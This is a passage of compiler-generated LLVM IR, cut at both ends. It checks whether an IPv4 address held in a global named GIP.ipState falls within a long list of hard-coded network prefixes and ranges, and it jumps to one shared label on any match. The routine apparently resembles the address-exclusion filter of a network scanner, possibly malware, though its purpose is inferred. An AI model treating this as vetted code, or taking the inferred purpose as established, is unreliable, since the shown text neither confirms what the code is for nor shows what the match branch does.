  %999 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1000 = zext i8 %999 to i32
  %1001 = icmp eq i32 %1000, 104
  br i1 %1001, label %1002, label %1006

; <label>:1002:                                   ; preds = %998
  %1003 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1004 = zext i8 %1003 to i32
  %1005 = icmp eq i32 %1004, 131
  br i1 %1005, label %2322, label %1006

; <label>:1006:                                   ; preds = %1002, %998
  %1007 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1008 = zext i8 %1007 to i32
  %1009 = icmp eq i32 %1008, 104
  br i1 %1009, label %1010, label %1014

; <label>:1010:                                   ; preds = %1006
  %1011 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1012 = zext i8 %1011 to i32
  %1013 = icmp eq i32 %1012, 236
  br i1 %1013, label %2322, label %1014

; <label>:1014:                                   ; preds = %1010, %1006
  %1015 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1016 = zext i8 %1015 to i32
  %1017 = icmp eq i32 %1016, 107
  br i1 %1017, label %1018, label %1022

; <label>:1018:                                   ; preds = %1014
  %1019 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1020 = zext i8 %1019 to i32
  %1021 = icmp eq i32 %1020, 170
  br i1 %1021, label %2322, label %1022

; <label>:1022:                                   ; preds = %1018, %1014
  %1023 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1024 = zext i8 %1023 to i32
  %1025 = icmp eq i32 %1024, 138
  br i1 %1025, label %1026, label %1030

; <label>:1026:                                   ; preds = %1022
  %1027 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1028 = zext i8 %1027 to i32
  %1029 = icmp eq i32 %1028, 197
  br i1 %1029, label %2322, label %1030

; <label>:1030:                                   ; preds = %1026, %1022
  %1031 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1032 = zext i8 %1031 to i32
  %1033 = icmp eq i32 %1032, 138
  br i1 %1033, label %1034, label %1038

; <label>:1034:                                   ; preds = %1030
  %1035 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1036 = zext i8 %1035 to i32
  %1037 = icmp eq i32 %1036, 68
  br i1 %1037, label %2322, label %1038

; <label>:1038:                                   ; preds = %1034, %1030
  %1039 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1040 = zext i8 %1039 to i32
  %1041 = icmp eq i32 %1040, 139
  br i1 %1041, label %1042, label %1046

; <label>:1042:                                   ; preds = %1038
  %1043 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1044 = zext i8 %1043 to i32
  %1045 = icmp eq i32 %1044, 59
  br i1 %1045, label %2322, label %1046

; <label>:1046:                                   ; preds = %1042, %1038
  %1047 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1048 = zext i8 %1047 to i32
  %1049 = icmp eq i32 %1048, 146
  br i1 %1049, label %1050, label %1062

; <label>:1050:                                   ; preds = %1046
  %1051 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1052 = zext i8 %1051 to i32
  %1053 = icmp eq i32 %1052, 185
  br i1 %1053, label %1054, label %1062

; <label>:1054:                                   ; preds = %1050
  %1055 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1056 = zext i8 %1055 to i32
  %1057 = icmp sge i32 %1056, 128
  br i1 %1057, label %1058, label %1062

; <label>:1058:                                   ; preds = %1054
  %1059 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1060 = zext i8 %1059 to i32
  %1061 = icmp slt i32 %1060, 191
  br i1 %1061, label %2322, label %1062

; <label>:1062:                                   ; preds = %1058, %1054, %1050, %1046
  %1063 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1064 = zext i8 %1063 to i32
  %1065 = icmp eq i32 %1064, 163
  br i1 %1065, label %1066, label %1078

; <label>:1066:                                   ; preds = %1062
  %1067 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1068 = zext i8 %1067 to i32
  %1069 = icmp eq i32 %1068, 47
  br i1 %1069, label %1070, label %1078

; <label>:1070:                                   ; preds = %1066
  %1071 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1072 = zext i8 %1071 to i32
  %1073 = icmp sge i32 %1072, 10
  br i1 %1073, label %1074, label %1078

; <label>:1074:                                   ; preds = %1070
  %1075 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1076 = zext i8 %1075 to i32
  %1077 = icmp slt i32 %1076, 11
  br i1 %1077, label %2322, label %1078

; <label>:1078:                                   ; preds = %1074, %1070, %1066, %1062
  %1079 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1080 = zext i8 %1079 to i32
  %1081 = icmp eq i32 %1080, 174
  br i1 %1081, label %1082, label %1094

; <label>:1082:                                   ; preds = %1078
  %1083 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1084 = zext i8 %1083 to i32
  %1085 = icmp eq i32 %1084, 138
  br i1 %1085, label %1086, label %1094

; <label>:1086:                                   ; preds = %1082
  %1087 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1088 = zext i8 %1087 to i32
  %1089 = icmp sge i32 %1088, 1
  br i1 %1089, label %1090, label %1094

; <label>:1090:                                   ; preds = %1086
  %1091 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1092 = zext i8 %1091 to i32
  %1093 = icmp slt i32 %1092, 127
  br i1 %1093, label %2322, label %1094

; <label>:1094:                                   ; preds = %1090, %1086, %1082, %1078
  %1095 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1096 = zext i8 %1095 to i32
  %1097 = icmp eq i32 %1096, 192
  br i1 %1097, label %1098, label %1110

; <label>:1098:                                   ; preds = %1094
  %1099 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1100 = zext i8 %1099 to i32
  %1101 = icmp eq i32 %1100, 241
  br i1 %1101, label %1102, label %1110

; <label>:1102:                                   ; preds = %1098
  %1103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1104 = zext i8 %1103 to i32
  %1105 = icmp sge i32 %1104, 128
  br i1 %1105, label %1106, label %1110

; <label>:1106:                                   ; preds = %1102
  %1107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1108 = zext i8 %1107 to i32
  %1109 = icmp slt i32 %1108, 255
  br i1 %1109, label %2322, label %1110

; <label>:1110:                                   ; preds = %1106, %1102, %1098, %1094
  %1111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1112 = zext i8 %1111 to i32
  %1113 = icmp eq i32 %1112, 198
  br i1 %1113, label %1114, label %1126

; <label>:1114:                                   ; preds = %1110
  %1115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1116 = zext i8 %1115 to i32
  %1117 = icmp eq i32 %1116, 199
  br i1 %1117, label %1118, label %1126

; <label>:1118:                                   ; preds = %1114
  %1119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1120 = zext i8 %1119 to i32
  %1121 = icmp sge i32 %1120, 64
  br i1 %1121, label %1122, label %1126

; <label>:1122:                                   ; preds = %1118
  %1123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1124 = zext i8 %1123 to i32
  %1125 = icmp slt i32 %1124, 127
  br i1 %1125, label %2322, label %1126

; <label>:1126:                                   ; preds = %1122, %1118, %1114, %1110
  %1127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1128 = zext i8 %1127 to i32
  %1129 = icmp eq i32 %1128, 198
  br i1 %1129, label %1130, label %1142

; <label>:1130:                                   ; preds = %1126
  %1131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1132 = zext i8 %1131 to i32
  %1133 = icmp eq i32 %1132, 211
  br i1 %1133, label %1134, label %1142

; <label>:1134:                                   ; preds = %1130
  %1135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1136 = zext i8 %1135 to i32
  %1137 = icmp sge i32 %1136, 96
  br i1 %1137, label %1138, label %1142

; <label>:1138:                                   ; preds = %1134
  %1139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1140 = zext i8 %1139 to i32
  %1141 = icmp slt i32 %1140, 127
  br i1 %1141, label %2322, label %1142

; <label>:1142:                                   ; preds = %1138, %1134, %1130, %1126
  %1143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1144 = zext i8 %1143 to i32
  %1145 = icmp eq i32 %1144, 207
  br i1 %1145, label %1146, label %1158

; <label>:1146:                                   ; preds = %1142
  %1147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1148 = zext i8 %1147 to i32
  %1149 = icmp eq i32 %1148, 154
  br i1 %1149, label %1150, label %1158

; <label>:1150:                                   ; preds = %1146
  %1151 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1152 = zext i8 %1151 to i32
  %1153 = icmp sge i32 %1152, 192
  br i1 %1153, label %1154, label %1158

; <label>:1154:                                   ; preds = %1150
  %1155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1156 = zext i8 %1155 to i32
  %1157 = icmp slt i32 %1156, 255
  br i1 %1157, label %2322, label %1158

; <label>:1158:                                   ; preds = %1154, %1150, %1146, %1142
  %1159 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1160 = zext i8 %1159 to i32
  %1161 = icmp eq i32 %1160, 37
  br i1 %1161, label %1162, label %1174

; <label>:1162:                                   ; preds = %1158
  %1163 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1164 = zext i8 %1163 to i32
  %1165 = icmp eq i32 %1164, 139
  br i1 %1165, label %1166, label %1174

; <label>:1166:                                   ; preds = %1162
  %1167 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1168 = zext i8 %1167 to i32
  %1169 = icmp sge i32 %1168, 1
  br i1 %1169, label %1170, label %1174

; <label>:1170:                                   ; preds = %1166
  %1171 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1172 = zext i8 %1171 to i32
  %1173 = icmp slt i32 %1172, 31
  br i1 %1173, label %2322, label %1174

; <label>:1174:                                   ; preds = %1170, %1166, %1162, %1158
  %1175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1176 = zext i8 %1175 to i32
  %1177 = icmp eq i32 %1176, 67
  br i1 %1177, label %1178, label %1190

; <label>:1178:                                   ; preds = %1174
  %1179 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1180 = zext i8 %1179 to i32
  %1181 = icmp eq i32 %1180, 207
  br i1 %1181, label %1182, label %1190

; <label>:1182:                                   ; preds = %1178
  %1183 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1184 = zext i8 %1183 to i32
  %1185 = icmp sge i32 %1184, 64
  br i1 %1185, label %1186, label %1190

; <label>:1186:                                   ; preds = %1182
  %1187 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1188 = zext i8 %1187 to i32
  %1189 = icmp slt i32 %1188, 95
  br i1 %1189, label %2322, label %1190

; <label>:1190:                                   ; preds = %1186, %1182, %1178, %1174
  %1191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1192 = zext i8 %1191 to i32
  %1193 = icmp eq i32 %1192, 67
  br i1 %1193, label %1194, label %1206

; <label>:1194:                                   ; preds = %1190
  %1195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1196 = zext i8 %1195 to i32
  %1197 = icmp eq i32 %1196, 205
  br i1 %1197, label %1198, label %1206

; <label>:1198:                                   ; preds = %1194
  %1199 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1200 = zext i8 %1199 to i32
  %1201 = icmp sge i32 %1200, 128
  br i1 %1201, label %1202, label %1206

; <label>:1202:                                   ; preds = %1198
  %1203 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1204 = zext i8 %1203 to i32
  %1205 = icmp slt i32 %1204, 191
  br i1 %1205, label %2322, label %1206

; <label>:1206:                                   ; preds = %1202, %1198, %1194, %1190
  %1207 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1208 = zext i8 %1207 to i32
  %1209 = icmp eq i32 %1208, 80
  br i1 %1209, label %1210, label %1222

; <label>:1210:                                   ; preds = %1206
  %1211 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1212 = zext i8 %1211 to i32
  %1213 = icmp eq i32 %1212, 240
  br i1 %1213, label %1214, label %1222

; <label>:1214:                                   ; preds = %1210
  %1215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1216 = zext i8 %1215 to i32
  %1217 = icmp sge i32 %1216, 128
  br i1 %1217, label %1218, label %1222

; <label>:1218:                                   ; preds = %1214
  %1219 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1220 = zext i8 %1219 to i32
  %1221 = icmp slt i32 %1220, 143
  br i1 %1221, label %2322, label %1222

; <label>:1222:                                   ; preds = %1218, %1214, %1210, %1206
  %1223 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1224 = zext i8 %1223 to i32
  %1225 = icmp eq i32 %1224, 82
  br i1 %1225, label %1226, label %1238

; <label>:1226:                                   ; preds = %1222
  %1227 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1228 = zext i8 %1227 to i32
  %1229 = icmp eq i32 %1228, 196
  br i1 %1229, label %1230, label %1238

; <label>:1230:                                   ; preds = %1226
  %1231 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1232 = zext i8 %1231 to i32
  %1233 = icmp sge i32 %1232, 1
  br i1 %1233, label %1234, label %1238

; <label>:1234:                                   ; preds = %1230
  %1235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1236 = zext i8 %1235 to i32
  %1237 = icmp slt i32 %1236, 15
  br i1 %1237, label %2322, label %1238

; <label>:1238:                                   ; preds = %1234, %1230, %1226, %1222
  %1239 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1240 = zext i8 %1239 to i32
  %1241 = icmp eq i32 %1240, 95
  br i1 %1241, label %1242, label %1254

; <label>:1242:                                   ; preds = %1238
  %1243 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1244 = zext i8 %1243 to i32
  %1245 = icmp eq i32 %1244, 85
  br i1 %1245, label %1246, label %1254

; <label>:1246:                                   ; preds = %1242
  %1247 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1248 = zext i8 %1247 to i32
  %1249 = icmp sge i32 %1248, 8
  br i1 %1249, label %1250, label %1254

; <label>:1250:                                   ; preds = %1246
  %1251 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1252 = zext i8 %1251 to i32
  %1253 = icmp slt i32 %1252, 63
  br i1 %1253, label %2322, label %1254

; <label>:1254:                                   ; preds = %1250, %1246, %1242, %1238
  %1255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1256 = zext i8 %1255 to i32
  %1257 = icmp eq i32 %1256, 64
  br i1 %1257, label %1258, label %1270

; <label>:1258:                                   ; preds = %1254
  %1259 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1260 = zext i8 %1259 to i32
  %1261 = icmp eq i32 %1260, 237
  br i1 %1261, label %1262, label %1270

; <label>:1262:                                   ; preds = %1258
  %1263 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1264 = zext i8 %1263 to i32
  %1265 = icmp sge i32 %1264, 32
  br i1 %1265, label %1266, label %1270

; <label>:1266:                                   ; preds = %1262
  %1267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1268 = zext i8 %1267 to i32
  %1269 = icmp slt i32 %1268, 43
  br i1 %1269, label %2322, label %1270

; <label>:1270:                                   ; preds = %1266, %1262, %1258, %1254
  %1271 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1272 = zext i8 %1271 to i32
  %1273 = icmp eq i32 %1272, 185
  br i1 %1273, label %1274, label %1286

; <label>:1274:                                   ; preds = %1270
  %1275 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1276 = zext i8 %1275 to i32
  %1277 = icmp eq i32 %1276, 92
  br i1 %1277, label %1278, label %1286

; <label>:1278:                                   ; preds = %1274
  %1279 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1280 = zext i8 %1279 to i32
  %1281 = icmp sge i32 %1280, 220
  br i1 %1281, label %1282, label %1286

; <label>:1282:                                   ; preds = %1278
  %1283 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1284 = zext i8 %1283 to i32
  %1285 = icmp slt i32 %1284, 223
  br i1 %1285, label %2322, label %1286

; <label>:1286:                                   ; preds = %1282, %1278, %1274, %1270
  %1287 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1288 = zext i8 %1287 to i32
  %1289 = icmp eq i32 %1288, 104
  br i1 %1289, label %1290, label %1302

; <label>:1290:                                   ; preds = %1286
  %1291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1292 = zext i8 %1291 to i32
  %1293 = icmp eq i32 %1292, 238
  br i1 %1293, label %1294, label %1302

; <label>:1294:                                   ; preds = %1290
  %1295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1296 = zext i8 %1295 to i32
  %1297 = icmp sge i32 %1296, 128
  br i1 %1297, label %1298, label %1302

; <label>:1298:                                   ; preds = %1294
  %1299 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1300 = zext i8 %1299 to i32
  %1301 = icmp slt i32 %1300, 191
  br i1 %1301, label %2322, label %1302

; <label>:1302:                                   ; preds = %1298, %1294, %1290, %1286
  %1303 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1304 = zext i8 %1303 to i32
  %1305 = icmp eq i32 %1304, 209
  br i1 %1305, label %1306, label %1318

; <label>:1306:                                   ; preds = %1302
  %1307 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1308 = zext i8 %1307 to i32
  %1309 = icmp eq i32 %1308, 222
  br i1 %1309, label %1310, label %1318

; <label>:1310:                                   ; preds = %1306
  %1311 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1312 = zext i8 %1311 to i32
  %1313 = icmp sge i32 %1312, 1
  br i1 %1313, label %1314, label %1318

; <label>:1314:                                   ; preds = %1310
  %1315 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1316 = zext i8 %1315 to i32
  %1317 = icmp slt i32 %1316, 31
  br i1 %1317, label %2322, label %1318

; <label>:1318:                                   ; preds = %1314, %1310, %1306, %1302
  %1319 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1320 = zext i8 %1319 to i32
  %1321 = icmp eq i32 %1320, 208
  br i1 %1321, label %1322, label %1334

; <label>:1322:                                   ; preds = %1318
  %1323 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1324 = zext i8 %1323 to i32
  %1325 = icmp eq i32 %1324, 167
  br i1 %1325, label %1326, label %1334

; <label>:1326:                                   ; preds = %1322
  %1327 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1328 = zext i8 %1327 to i32
  %1329 = icmp sge i32 %1328, 232
  br i1 %1329, label %1330, label %1334

; <label>:1330:                                   ; preds = %1326
  %1331 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1332 = zext i8 %1331 to i32
  %1333 = icmp slt i32 %1332, 252
  br i1 %1333, label %2322, label %1334

; <label>:1334:                                   ; preds = %1330, %1326, %1322, %1318
  %1335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1336 = zext i8 %1335 to i32
  %1337 = icmp eq i32 %1336, 66
  br i1 %1337, label %1338, label %1350

; <label>:1338:                                   ; preds = %1334
  %1339 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1340 = zext i8 %1339 to i32
  %1341 = icmp eq i32 %1340, 55
  br i1 %1341, label %1342, label %1350

; <label>:1342:                                   ; preds = %1338
  %1343 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1344 = zext i8 %1343 to i32
  %1345 = icmp sge i32 %1344, 128
  br i1 %1345, label %1346, label %1350

; <label>:1346:                                   ; preds = %1342
  %1347 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1348 = zext i8 %1347 to i32
  %1349 = icmp slt i32 %1348, 159
  br i1 %1349, label %2322, label %1350

; <label>:1350:                                   ; preds = %1346, %1342, %1338, %1334
  %1351 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1352 = zext i8 %1351 to i32
  %1353 = icmp eq i32 %1352, 45
  br i1 %1353, label %1354, label %1366

; <label>:1354:                                   ; preds = %1350
  %1355 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1356 = zext i8 %1355 to i32
  %1357 = icmp eq i32 %1356, 63
  br i1 %1357, label %1358, label %1366

; <label>:1358:                                   ; preds = %1354
  %1359 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1360 = zext i8 %1359 to i32
  %1361 = icmp sge i32 %1360, 1
  br i1 %1361, label %1362, label %1366

; <label>:1362:                                   ; preds = %1358
  %1363 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1364 = zext i8 %1363 to i32
  %1365 = icmp slt i32 %1364, 127
  br i1 %1365, label %2322, label %1366

; <label>:1366:                                   ; preds = %1362, %1358, %1354, %1350
  %1367 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1368 = zext i8 %1367 to i32
  %1369 = icmp eq i32 %1368, 216
  br i1 %1369, label %1370, label %1382

; <label>:1370:                                   ; preds = %1366
  %1371 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1372 = zext i8 %1371 to i32
  %1373 = icmp eq i32 %1372, 237
  br i1 %1373, label %1374, label %1382

; <label>:1374:                                   ; preds = %1370
  %1375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1376 = zext i8 %1375 to i32
  %1377 = icmp sge i32 %1376, 128
  br i1 %1377, label %1378, label %1382

; <label>:1378:                                   ; preds = %1374
  %1379 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1380 = zext i8 %1379 to i32
  %1381 = icmp slt i32 %1380, 159
  br i1 %1381, label %2322, label %1382

; <label>:1382:                                   ; preds = %1378, %1374, %1370, %1366
  %1383 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1384 = zext i8 %1383 to i32
  %1385 = icmp eq i32 %1384, 108
  br i1 %1385, label %1386, label %1390

; <label>:1386:                                   ; preds = %1382
  %1387 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1388 = zext i8 %1387 to i32
  %1389 = icmp eq i32 %1388, 61
  br i1 %1389, label %2322, label %1390

; <label>:1390:                                   ; preds = %1386, %1382
  %1391 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1392 = zext i8 %1391 to i32
  %1393 = icmp eq i32 %1392, 45
  br i1 %1393, label %1394, label %1398

; <label>:1394:                                   ; preds = %1390
  %1395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1396 = zext i8 %1395 to i32
  %1397 = icmp eq i32 %1396, 76
  br i1 %1397, label %2322, label %1398

; <label>:1398:                                   ; preds = %1394, %1390
  %1399 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1400 = zext i8 %1399 to i32
  %1401 = icmp eq i32 %1400, 185
  br i1 %1401, label %1402, label %1414

; <label>:1402:                                   ; preds = %1398
  %1403 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1404 = zext i8 %1403 to i32
  %1405 = icmp eq i32 %1404, 11
  br i1 %1405, label %1406, label %1414

; <label>:1406:                                   ; preds = %1402
  %1407 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1408 = zext i8 %1407 to i32
  %1409 = icmp sge i32 %1408, 144
  br i1 %1409, label %1410, label %1414

; <label>:1410:                                   ; preds = %1406
  %1411 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1412 = zext i8 %1411 to i32
  %1413 = icmp slt i32 %1412, 148
  br i1 %1413, label %2322, label %1414

; <label>:1414:                                   ; preds = %1410, %1406, %1402, %1398
  %1415 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1416 = zext i8 %1415 to i32
  %1417 = icmp eq i32 %1416, 185
  br i1 %1417, label %1418, label %1430

; <label>:1418:                                   ; preds = %1414
